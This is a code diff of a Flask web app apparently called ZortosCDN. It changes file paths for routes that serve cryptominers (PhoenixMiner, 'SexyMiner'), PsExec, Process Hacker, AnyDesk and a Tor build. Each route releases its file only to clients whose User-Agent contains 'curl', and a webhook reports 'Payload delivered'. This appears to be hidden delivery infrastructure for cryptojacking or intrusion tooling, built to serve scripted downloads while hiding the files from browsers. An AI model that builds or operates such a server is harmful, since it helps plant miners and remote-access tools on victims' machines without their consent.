@@ -24,7 +24,7 @@ def verify_password(username, password):
     
 @app.route('/api/download/pm.exe')
 def downloadPhoenixMiner():
-    path = "/home/azureuser/ZortosCDN/pm.exe" # Add your own directory
+    path = "C:/Users/Administrator/Desktop/ZortosCDN/pm.exe" 
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -35,7 +35,7 @@ def downloadPhoenixMiner():
 
 @app.route('/api/download/TorBuild.zip')
 def downloadTor():
-    path = "/home/azureuser/ZortosCDN/TorBuild.zip" # Add your own directory
+    path = "C:/Users/Administrator/Desktop/ZortosCDN/TorBuild.zip"
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -48,7 +48,7 @@ def downloadTor():
     
 @app.route('/api/download/SexyMiner.exe')
 def downloadSexyMiner():
-    path = "/home/azureuser/ZortosCDN/SexyMiner.exe" # Add your own directory
+    path = "C:/Users/Administrator/Desktop/ZortosCDN/SexyMiner.exe" 
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -60,7 +60,7 @@ def downloadSexyMiner():
     
 @app.route('/api/download/PsExec.exe')
 def downloadpsexec():
-    path = "/home/azureuser/ZortosCDN/PsExec.exe" # Add your own directory
+    path = "C:/Users/Administrator/Desktop/ZortosCDN/PsExec.exe" # Add your own directory
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -73,7 +73,7 @@ def downloadpsexec():
 
 @app.route('/api/download/ph64.exe')
 def downloadProccessHack():
-    path = "/home/azureuser/ZortosCDN/ph64.exe" # Add your own directory
+    path = "C:/Users/Administrator/Desktop/ZortosCDN/ph64.exe" #Add your own directory
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -85,7 +85,7 @@ def downloadProccessHack():
 
 @app.route('/api/download/Anydesk.exe')
 def downloadAnydesk():
-    path = "/home/azureuser/ZortosCDN/Anydesk.exe" # Add your own directory
+    path = "C:/Users/Administrator/Desktop/ZortosCDN/Anydesk.exe" #Add your own directory
     useragent = request.headers.get('User-Agent')
     
     if 'curl' in useragent:
@@ -106,7 +106,7 @@ def webhook():
         except requests.exceptions.HTTPError as err:
             print(err)
         else:
-            print("Payload delivered successfully, code {}.".format(
+            print("Payload delivered successfully.".format(
                 result.status_code))
         return 'success', 200
     else:
